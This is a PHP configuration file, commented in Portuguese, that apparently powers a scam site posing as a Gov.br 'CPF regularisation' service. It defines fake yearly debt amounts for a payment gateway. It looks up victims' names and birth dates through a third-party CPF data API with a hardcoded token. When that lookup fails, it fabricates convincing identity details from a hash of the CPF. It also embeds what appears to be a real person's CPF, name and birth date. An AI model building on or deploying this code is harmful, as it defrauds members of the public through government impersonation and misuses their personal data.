<?php
// Configurações Globais do Site de Reconstrução Fiscal

// Valores de débito para cada ano (em centavos)
define('VALOR_2020', 9401);  // R$ 94,01 (Obrigatório)
define('VALOR_2021', 8343);  // R$ 83,43
define('VALOR_2022', 9125);  // R$ 91,25
define('VALOR_2023', 9987);  // R$ 99,87
define('VALOR_2024', 10845); // R$ 108,45
define('VALOR_2025', 12458); // R$ 124,58

// Nome do Produto a ser exibido no gateway
define('PRODUTO_NOME', 'Regularização CPF Gov BR');

// URL e Token da API de consulta de CPF real (se houver). 
// Altere para a URL e Token do seu provedor.
define('API_CONSULTA_URL', 'https://base4.sistemafullativo.online:81/api/cpfx?CPF='); // Exemplo de endpoint
define('API_CONSULTA_TOKEN', '78E092FDEA'); // Insira o token/chave da sua API aqui se necessário

/**
 * Função para obter dados reais ou fictícios com base no CPF (apenas números).
 * Tenta consultar uma API real configurada. Se falhar ou não estiver configurada,
 * utiliza o gerador matemático determinístico baseado no CPF.
 */
function obterDadosCPF($cpf_limpo) {
    // CPF de teste original
    if ($cpf_limpo === '46620588808' || $cpf_limpo === '466.205.888-08') {
        return [
            'nome'       => 'Caique Dos Santos Pires',
            'nascimento' => '09/11/2004'
        ];
    }

    // 1. Tentativa de Consulta via API real se configurada
    if (!empty(API_CONSULTA_TOKEN) || (defined('API_CONSULTA_URL') && API_CONSULTA_URL !== 'https://base4.sistemafullativo.online:81/api/cpfx?CPF=')) {
        try {
            $url = API_CONSULTA_URL . $cpf_limpo;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Timeout rápido de 5 segundos
            
            $headers = ['Content-Type: application/json'];
            if (!empty(API_CONSULTA_TOKEN)) {
                $headers[] = 'Authorization: Bearer ' . API_CONSULTA_TOKEN;
            }
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            // curl_close($ch); // Desnecessário no PHP 8.0+ e depreciado no 8.5
            
            if ($http_code === 200 && !empty($response)) {
                $dados_api = json_decode($response, true);
                // Mapeamento comum de APIs de CPF (ajuste de acordo com o retorno da sua API)
                $nome = $dados_api['nome'] ?? $dados_api['nome_completo'] ?? $dados_api['data']['nome'] ?? '';
                $nasc = $dados_api['nascimento'] ?? $dados_api['data_nascimento'] ?? $dados_api['data']['nascimento'] ?? '';
                
                if (!empty($nome)) {
                    // Se a data de nascimento vier no formato YYYY-MM-DD, converte para DD/MM/YYYY
                    if (preg_match('/^\d{4}-\d{2}-\d{2}$/', $nasc)) {
                        $nasc = date('d/m/Y', strtotime($nasc));
                    }
                    return [
                        'nome'       => mb_convert_case($nome, MB_CASE_TITLE, 'UTF-8'),
                        'nascimento' => $nasc ?: '01/01/1990'
                    ];
                }
            }
        } catch (Exception $e) {
            // Se falhar a API, segue para o fallback determinístico
        }
    }

    // 2. Fallback: Listas para geração determinística (se não configurada ou se falhar)
    $primeiros_nomes = [
        'José', 'Maria', 'João', 'Ana', 'Antônio', 'Francisco',
        'Carlos', 'Paulo', 'Lucas', 'Luiz', 'Marcos', 'Juliana',
        'Fernanda', 'Patrícia', 'Camila', 'Aline', 'Sandra',
        'Roberto', 'Anderson', 'Bruno'
    ];
    $sobrenomes = [
        'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira',
        'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro',
        'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Dias',
        'Vieira', 'Rocha'
    ];

    $n = count($primeiros_nomes);
    $s = count($sobrenomes);

    // Gera hashes independentes para cada campo usando o CPF completo como chave
    $h1 = abs(crc32($cpf_limpo . 'nome1'));
    $h2 = abs(crc32($cpf_limpo . 'sobrenome1'));
    $h3 = abs(crc32($cpf_limpo . 'sobrenome2'));
    $hd = abs(crc32($cpf_limpo . 'dia'));
    $hm = abs(crc32($cpf_limpo . 'mes'));
    $ha = abs(crc32($cpf_limpo . 'ano'));

    $nome1 = $primeiros_nomes[$h1 % $n];
    $nome2 = $sobrenomes[$h2 % $s];
    $nome3 = $sobrenomes[$h3 % $s];

    $dia = str_pad(($hd % 28) + 1, 2, '0', STR_PAD_LEFT);
    $mes = str_pad(($hm % 12) + 1, 2, '0', STR_PAD_LEFT);
    $ano = 1965 + ($ha % 41); // 1965–2005

    return [
        'nome'       => "$nome1 $nome2 $nome3",
        'nascimento' => "$dia/$mes/$ano"
    ];
}
